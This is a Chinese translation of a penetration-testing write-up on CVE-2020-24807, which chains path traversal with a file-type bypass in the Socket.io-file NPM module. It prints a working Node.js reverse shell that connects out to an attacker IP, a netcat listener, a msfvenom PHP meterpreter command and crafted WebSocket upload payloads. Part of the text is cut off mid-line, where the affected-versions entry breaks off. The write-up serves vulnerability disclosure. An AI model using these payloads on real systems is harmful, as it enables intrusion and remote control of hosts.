# CVE-2020-24807：绕过Socket.io-file NPM模块中的文件类型限制
|
##### 译文声明
本文是翻译文章，文章原作者 pentestmag，文章来源：pentestmag.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
在某些渗透测试中，我们面对的目标应用安全性较高，没有太多错误配置，这意味着如果时间允许，我们需要深入分析。在某次渗透测试中，我们找到了运行在嵌入式设备上的一个web应用，该应用使用WebSocket来实现服务端和客户端之间的通信。后端系统可以采用多种技术来使用WebSocket，这里应用使用的是Socket.io。
该应用的主要功能之一就是上传文件，使用了Socket.io-file的NPM模块实现文件上传。大家可以参考[此处](https://blog.auxiliumcybersec.com/?p=2586)，了解我们在该模块中最近找到的一个漏洞信息。简而言之，这是一个路径遍历漏洞，允许攻击者将文件上传到系统中web
server用户具备权限的任意路径中。
如果我们可以篡改`ssh_config`文件，或者`/etc/passwd`以及`/etc/shadow`的话，那么这个漏洞本身就可以实现远程代码执行。但只有当web
server以root权限运行时才满足该条件，所以我们需要进一步分析，才能以较低权限用户实现远程代码执行。
我们在Socket.io-file模块中找到了一个文件类型限制绕过漏洞。通过该漏洞，我们可以绕过模块配置文件中限制的文件类型。比如我们可以上传任意文件类型，通过修改底层配置文件，上传适当的shell，实现底层系统的远程代码执行。
除此之外，socket.io-file的上传功能对输入数据也存在不正确的验证逻辑，分布在代码的不同部分中。攻击者可借此绕过上传文件类型限制，将所选的文件类型上传到底层系统中。
漏洞基本信息：
    CVE-ID: 2020-24807
    安全公告: https://github.com/advisories/GHSA-6495-8jvh-f28x
    适用版本: `标签，包含目标js文件。
随后我们可以上传一个`.js`文件（与修改过的`index.html`文件中的文件名对应，由服务端加载），该文件中包含如下代码：
    (function(){
    var net = require(“net”),
    cp = require(“child_process”),
    sh = cp.spawn(“/bin/sh”, []);
    var client = new net.Socket();
    client.connect(8080, “10.17.26.64”, function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
    })();
这个反弹shell只适用于特定错误配置的Node.js安装环境，但在实际环境中我们经常会碰到这类环境。我们可以修改监听端的IP及端口（攻击端可以运行`nc
-lnvp 8080`命令），获得反弹shell，在目标系统中执行命令。
###  场景2：利用特定的配置文件漏洞
在实际环境中，可能存在许多不同的配置场景，这些配置中运行着存在漏洞的模块，比如运行着PHP的node.js服务器。这听上去非常玄幻，但的确有些多功能服务器支持这种场景，此时漏洞利用起来就相对比较容易。
我们可以使用msfvenom，运行如下命令来创建PHP反向shell：
    msfvenom -p php/meterpreter_reverse_tcp LHOST=10.17.26.64 LPORT=4443 -f raw > shell.mp3
图2. 创建PHP反向shell，开始监听
这样当服务端执行该php文件后，我们可以在监听端收到反弹shell。为了使用我们的组合漏洞来上传文件，我们可以修改上传文件的WebSocket请求：
    42[“socket.io-file::createFile”,{“id”:”u_0″,”name”:”../public/shell.php”,”size”:1,”chunkSize”:10240,”sent”:0,”data”:{}}]
图3. 原始上传请求与修改过的请求对比
这样我们可以将文件上传到web server的`public`目录，在当前配置中可以被访问到。然后通过浏览器来执行php
shell，在攻击端收到反弹shell：
图4. 成功执行远程代码
## 0x03 漏洞复现
为了复现该漏洞，我们可以执行如下操作：
1、设置代理，以拦截HTTP及WebSocket请求（比如Burp Suite或者OWASP Zap）。
2、创建web应用可接受的文件类型（文件内容任意）。
3、使用Socket.io-file上传文件，拦截WebSocket请求。
4、修改`name`参数，改成我们所需的文件类型，如`42[“socket.io-file::createFile”,{“id”:”u_0″,”name”:”testfile.php”,”size”:1,”chunkSize”:10240,”sent”:0,”data”:{}}]`，这样就能以当前用户权限在data目录创建`testfile.php`（测试环境中，服务器存储文件的路径为`/home/ubuntutest/Documents/socket-app/data`）。
## 0x04 时间线
2020年7月31日：提交漏洞
2020年8月11日：安全团队验证漏洞
2020年10月2日：发布安全公告
2020年10月6日：分配CVE ID